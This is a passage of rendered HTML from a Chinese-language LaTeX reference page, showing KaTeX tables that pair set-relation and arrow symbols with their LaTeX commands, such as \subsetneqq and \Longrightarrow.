xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⫋</mo></mrow><annotation encoding="application/x-tex">\subsetneqq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.07864em;vertical-align:-0.28481em;"></span><span class="mrel amsrm">⫋</span></span></span></span></td><td style="text-align:left">\subsetneqq</td></tr><tr><td style="text-align:center">18</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>∖</mo></mrow><annotation encoding="application/x-tex">\setminus</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∖</span></span></span></span></td><td style="text-align:left">\setminus</td><td style="text-align:center">40</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⫋</mo></mrow><annotation encoding="application/x-tex">\varsubsetneqq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.00868em;vertical-align:-0.25142em;"></span><span class="mrel amsrm"></span></span></span></span></td><td style="text-align:left">\varsubsetneqq</td></tr><tr><td style="text-align:center">19</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>∖</mo></mrow><annotation encoding="application/x-tex">\smallsetminus</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66334em;vertical-align:-0.08167em;"></span><span class="mord amsrm">∖</span></span></span></span></td><td style="text-align:left">\smallsetminus</td><td style="text-align:center">41</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⫆</mo></mrow><annotation encoding="application/x-tex">\supseteqq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.01166em;vertical-align:-0.25583em;"></span><span class="mrel amsrm">⫆</span></span></span></span></td><td style="text-align:left">\supseteqq</td></tr><tr><td style="text-align:center">20</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>×</mo></mrow><annotation encoding="application/x-tex">\times</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">×</span></span></span></span></td><td style="text-align:left">\times</td><td style="text-align:center">42</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⊉</mo></mrow><annotation encoding="application/x-tex">\nsupseteqq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.00868em;vertical-align:-0.25142em;"></span><span class="mrel amsrm"></span></span></span></span></td><td style="text-align:left">\nsupseteqq</td></tr><tr><td style="text-align:center">21</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⊂</mo></mrow><annotation encoding="application/x-tex">\subset</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">⊂</span></span></span></span></td><td style="text-align:left">\subset</td><td style="text-align:center">43</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⫌</mo></mrow><annotation encoding="application/x-tex">\supsetneqq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.07864em;vertical-align:-0.28481em;"></span><span class="mrel amsrm">⫌</span></span></span></span></td><td style="text-align:left">\supsetneqq</td></tr><tr><td style="text-align:center">22</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⋐</mo></mrow><annotation encoding="application/x-tex">\Subset</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58503em;vertical-align:-0.03517em;"></span><span class="mrel amsrm">⋐</span></span></span></span></td><td style="text-align:left">\Subset</td><td style="text-align:center">44</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⫌</mo></mrow><annotation encoding="application/x-tex">\varsupsetneqq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.00868em;vertical-align:-0.25142em;"></span><span class="mrel amsrm"></span></span></span></span></td><td style="text-align:left">\varsupsetneqq</td></tr></tbody></table><h3 id="218-箭头-arrows"><a class="markdownIt-Anchor" href="#218-箭头-arrows"></a> 2.1.8 箭头 Arrows</h3><table><thead><tr><th style="text-align:center">序号</th><th style="text-align:center">图标</th><th style="text-align:left">LaTeX</th><th style="text-align:center">序号</th><th style="text-align:center">图标</th><th style="text-align:left">LaTeX</th></tr></thead><tbody><tr><td style="text-align:center">1</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⇛</mo></mrow><annotation encoding="application/x-tex">\Rrightarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7733399999999999em;vertical-align:-0.13667em;"></span><span class="mrel amsrm">⇛</span></span></span></span></td><td style="text-align:left">\Rrightarrow</td><td style="text-align:center">36</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⟼</mo></mrow><annotation encoding="application/x-tex">\longmapsto</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.522em;vertical-align:-0.011em;"></span><span class="mrel">⟼</span></span></span></span></td><td style="text-align:left">\longmapsto</td></tr><tr><td style="text-align:center">2</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⇚</mo></mrow><annotation encoding="application/x-tex">\Lleftarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7733399999999999em;vertical-align:-0.13667em;"></span><span class="mrel amsrm">⇚</span></span></span></span></td><td style="text-align:left">\Lleftarrow</td><td style="text-align:center">37</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⇀</mo></mrow><annotation encoding="application/x-tex">\rightharpoonup</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">⇀</span></span></span></span></td><td style="text-align:left">\rightharpoonup</td></tr><tr><td style="text-align:center">3</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⇒</mo></mrow><annotation encoding="application/x-tex">\Rightarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">⇒</span></span></span></span></td><td style="text-align:left">\Rightarrow</td><td style="text-align:center">38</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⇁</mo></mrow><annotation encoding="application/x-tex">\rightharpoondown</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">⇁</span></span></span></span></td><td style="text-align:left">\rightharpoondown</td></tr><tr><td style="text-align:center">4</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⇏</mo></mrow><annotation encoding="application/x-tex">\nRightarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel amsrm">⇏</span></span></span></span></td><td style="text-align:left">\nRightarrow</td><td style="text-align:center">39</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>↼</mo></mrow><annotation encoding="application/x-tex">\leftharpoonup</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">↼</span></span></span></span></td><td style="text-align:left">\leftharpoonup</td></tr><tr><td style="text-align:center">5</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⟹</mo></mrow><annotation encoding="application/x-tex">\Longrightarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.549em;vertical-align:-0.024em;"></span><span class="mrel">⟹</span></span></span></span></td><td style="text-align:left">\Longrightarrow</td><td style="text-align:center">40</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>↽</mo></mrow><annotation encoding="application/x-tex">\leftharpoondown</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">↽</span></span></span></span></td><td style="text-align:left">\leftharpoondown</td></tr><tr><td style="text-align:center">6</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>  </mtext><mo>⟹</mo><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\implies</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.549em;vertical-align:-0.024em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">⟹</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span></td><td style="text-align:left">\implies</td><td style="text-align:center">41</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>↿</mo></mrow><annotation encoding="application/x-tex">\upharpoonleft</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8866799999999999em;vertical-align:-0.19444em;"></span><span class="mrel amsrm">↿</span></span></span></span></td><td style="text-align:left">\upharpoonleft</td></tr><tr><td style="text-align:center">7</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⇐</mo></mrow><annotation encoding="application/x-tex">\Leftarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">⇐</span></span></span></span></td><td style="text-align:left">\Leftarrow</td><td style="text-align:center">42</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>↾</mo></mrow><annotation encoding="application/x-tex">\upharpoonright</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8866799999999999em;vertical-align:-0.19444em;"></span><span class="mrel amsrm">↾</span></span></span></span></td><td style="text-align:left">\upharpoonright</td></tr><tr><td style="text-align:center">8</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⇍</mo></mrow><annotation encoding="application/x-tex">\nLeftarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel amsrm">⇍</span></span></span></span></td><td style="text-align:left">\nLeftarrow</td><td style="text-align:center">43</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⇃</mo></mrow><annotation encoding="application/x-tex">\downharpoonleft</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8866799999999999em;vertical-align:-0.19444em;"></span><span class="mrel amsrm">⇃</span></span></span></span></td><td style="text-align:left">\downharpoonleft</td></tr><tr><td style="text-align:center">9</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⟸</mo></mrow><annotation encoding="application/x-tex">\Longleftarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.549em;vertical-align:-0.024em;"></span><span class="mrel">⟸</span></span></span></span></td><td style="text-align:left">\Longleftarrow</td><td style="text-align:center">44</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⇂</mo></mrow><annotation encoding="application/x-tex">\downharpoonright</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8866799999999999em;vertical-align:-0.19444em;"></span><span class="mrel amsrm">⇂</span></span></span></span></td><td style="text-align:left">\downharpoonright</td></tr><tr><td style="text-align:center">10</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⇔</mo></mrow><annotation encoding="application/x-tex">\Leftrightarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">⇔</span></span></span></span></td><td style="text-align:left">\Leftrightarrow</td><td style="text-align:center">45</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⇌</mo></mrow><annotation encoding="application/x-tex">\rightleftharpoons</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.682em;vertical-align:-0.011em;"></span><span class="mrel">⇌</span></span></span></span></td><td style="text-align:left">\rightleftharpoons</td></tr><tr><td style="text-align:center">11</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⇎</mo></mrow><annotation encoding="application/x-tex">\nLeftrightarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel amsrm">⇎</span></span></span></span></td><td style="text-align:left">\nLeftrightarrow</td><td style="text-align:center">46</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⇋</mo></mrow><annotation encoding="application/x-tex">\leftrightharpoons</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.53593em;vertical-align:-0.01354em;"></span><span class="mrel amsrm">⇋</span></span></span></span></td><td style="text-align:left">\leftrightharpoons</td></tr><tr><td style="text-align:center">12</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⟺</mo></mrow><annotation encoding="application/x-tex">\Longleftrightarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.549em;vertical-align:-0.024em;"></span><span class="mrel">⟺</span></span></span></span></td><td style="text-align:left">\Longleftrightarrow</td><td style="text-align:center">47</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>↶</mo></mrow><annotation encoding="application/x-tex">\curvearrowleft</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mrel amsrm">↶</span></span></span></span></td><td style="text-align:left">\curvearrowleft</td></tr><tr><td style="text-align:center">13</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>  </mtext><mo>⟺</mo><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\iff</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.549em;vertical-align:-0.024em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">⟺</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span></td><td style="text-align:left">\iff</td><td style="text-align:center">48</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>↺</mo></mrow><annotation encoding="application/x-tex">\circlearrowleft</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6639600000000001em;vertical-align:-0.08198em;"></span><span class="mrel amsrm">↺</span></span></span></span></td><td style="text-align:left">\circlearrowleft</td></tr><tr><td style="text-align:center">14</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⇑</mo></mrow><annotation encoding="application/x-tex">\Uparrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mrel">⇑</span></span></span></span></td><td style="text-align:left">\Uparrow</td><td style="text-align:center">49</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>↰</mo></mrow><annotation encoding="application/x-tex">\Lsh</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69224em;vertical-align:0em;"></span><span class="mrel amsrm">↰</span></span></span></span></td><td style="text-align:left">\Lsh</td></tr><tr><td style="text-align:center">15</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⇓</mo></mrow><annotation encoding="application/x-tex">\Downarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mrel">⇓</span></span></span></span></td><td style="text-align:left">\Downarrow</td><td style="text-align:center">50</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⇈</mo></mrow><annotation encoding="application/x-tex">\upuparrows</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8866799999999999em;vertical-align:-0.19444em;"></span><span class="mrel amsrm">⇈</span></span></span></span></td><td style="text-align:left">\upuparrows</td></tr><tr><td style="text-align:center">16</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⇕</mo></mrow><annotation encoding="application/x-tex">\Updownarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mrel">⇕</span></span></span></span></td><td style="text-align:left">\Updownarrow</td><td style="text-align:center">51</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⇉</mo></mrow><annotation encoding="application/x-tex">\rightrightarrows</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8558em;vertical-align:-0.1808em;"></span><span class="mrel amsrm">⇉</span></span></span></span></td><td style="text-align:left">\rightrightarrows</td></tr><tr><td style="text-align:center">17</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>→</mo></mrow><annotation encoding="application/x-tex">\rightarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">→</span></span></span></span></td><td style="text-align:left">\rightarrow</td><td style="text-align:center">52</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⇄</mo></mrow><annotation encoding="application/x-tex">\rightleftarrows</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8558em;vertical-align:-0.1808em;"></span><span class="mrel amsrm">⇄</span></span></span></span></td><td style="text-align:left">\rightleftarrows</td></tr><tr><td style="text-align:center">18</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>→</mo></mrow><annotation encoding="application/x-tex">\to</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">→</span></span></span></span></td><td style="text-align:left">\to</td><td style="text-align:center">53</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>↣</mo></mrow><annotation encoding="application/x-tex">\rightarrowtail</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.53593em;vertical-align:-0.01354em;"></span><span class="mrel amsrm">↣</span></span></span></span></td><td style="text-align:left">\rightarrowtail</td></tr><tr><td style="text-align:center">19</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>↛</mo></mrow><annotation encoding="application/x-tex">\nrightarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel amsrm">↛</span></span></span></span></td><td style="text-align:left">\nrightarrow</td><td style="text-align:center">54</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>↬</mo></mrow><annotation encoding="application/x-tex">\looparrowright</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.54986em;vertical-align:0em;"></span><span class="mrel amsrm">↬</span></span></span></span></td><td style="text-align:left">\looparrowright</td></tr><tr><td style="text-align:center">20</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⟶</mo></mrow><annotation encoding="application/x-tex">\longrightarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.522em;vertical-align:-0.011em;"></span><span class="mrel">⟶</span></span></span></span></td><td style="text-align:left">\longrightarrow</td><td style="text-align:center">55</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>↷</mo></mrow><annotation encoding="application/x-tex">\curvearrowright</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mrel amsrm">↷</span></span></span></span></td><td style="text-align:left">\curvearrowright</td></tr><tr><td style="text-align:center">21</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>←</mo></mrow><annotation encoding="application/x-tex">\leftarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">←</span></span></span></span></td><td style="text-align:left">\leftarrow</td><td style="text-align:center">56</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>↻</mo></mrow><annotation encoding="application/x-tex">\circlearrowright</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6639600000000001em;vertical-align:-0.08198em;"></span><span class="mrel amsrm">↻</span></span></span></span></td><td style="text-align:left">\circlearrowright</td></tr><tr><td style="text-align:center">22</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>←</mo></mrow><annotation encoding="application/x-tex">\gets</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">←</span></span></span></span></td><td style="text-align:left">\gets</td><td style="text-align:center">57</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>↱</mo></mrow><annotation encoding="application/x-tex">\Rsh</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69224em;vertical-align:0em;"></span><span class="mrel amsrm">↱</span></span></span></span></td><td style="text-align:left">\Rsh</td></tr><tr><td style="text-align:center">23</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>↚</mo></mrow><annotation encoding="application/x-tex">\nleftarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel amsrm">↚</span></span></span></span></td><td style="text-align:left">\nleftarrow</td><td style="text-align:center">58</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⇊</mo></mrow><annotation encoding="application/x-tex">\downdownarrows</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8866799999999999em;vertical-align:-0.19444em;"></span><span class="mrel amsrm">⇊</span></span></span></span></td><td style="text-align:left">\downdownarrows</td></tr><tr><td style="text-align:center">24</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⟵</mo></mrow><annotation encoding="application/x-tex">\longleftarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.522em;vertical-align:-0.011em;"></span><span class="mrel">⟵</span></span></span></span></td><td style="text-align:left">\longleftarrow</td><td style="text-align:center">59</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⇇</mo></mrow><annotation encoding="application/x-tex">\leftleftarrows</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8558em;vertical-align:-0.1808em;"></span><span class="mrel amsrm">⇇</span></span></span></span></td><td style="text-align:left">\leftleftarrows</td></tr><tr><td style="text-align:center">25</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>↔</mo></mrow><annotation encoding="application/x-tex">\leftrightarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">↔</span></span></span></span></td><td style="text-align:left">\leftrightarrow</td><td style="text-align:center">60</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⇆</mo></mrow><annotation encoding="application/x-tex">\leftrightarrows</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8558em;vertical-align:-0.1808em;"></span><span class="mrel amsrm">⇆</span></span></span></span></td><td style="text-align:left">\leftrightarrows</td></tr><tr><td style="text-align:center">26</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>↮</mo></mrow><annotation encoding="application/x-tex">\nleftrightarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel amsrm">↮</span></span></span></span></td><td style="text-align:left">\nleftrightarrow</td><td style="text-align:center">61</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>↢</mo></mrow><annotation encoding="application/x-tex">\leftarrowtail</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.53593em;vertical-align:-0.01354em;"></span><span class="mrel amsrm">↢</span></span></span></span></td><td style="text-align:left">\leftarrowtail</td></tr><tr><td style="text-align:center">27</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⟷</mo></mrow><annotation encoding="application/x-tex">\longleftrightarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.522em;vertical-align:-0.011em;"></span><span class="mrel">⟷</span></span></span></span></td><td style="text-align:left">\longleftrightarrow</td><td style="text-align:center">62</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>↫</mo></mrow><annotation encoding="application/x-tex">\looparrowleft</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.54986em;vertical-align:0em;"></span><span class="mrel amsrm">↫</span></span></span></span></td><td style="text-align:left">\looparrowleft</td></tr><tr><td style="text-align:center">28</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>↑</mo></mrow><annotation encoding="application/x-tex">\uparrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mrel">↑</span></span></span></span></td><td 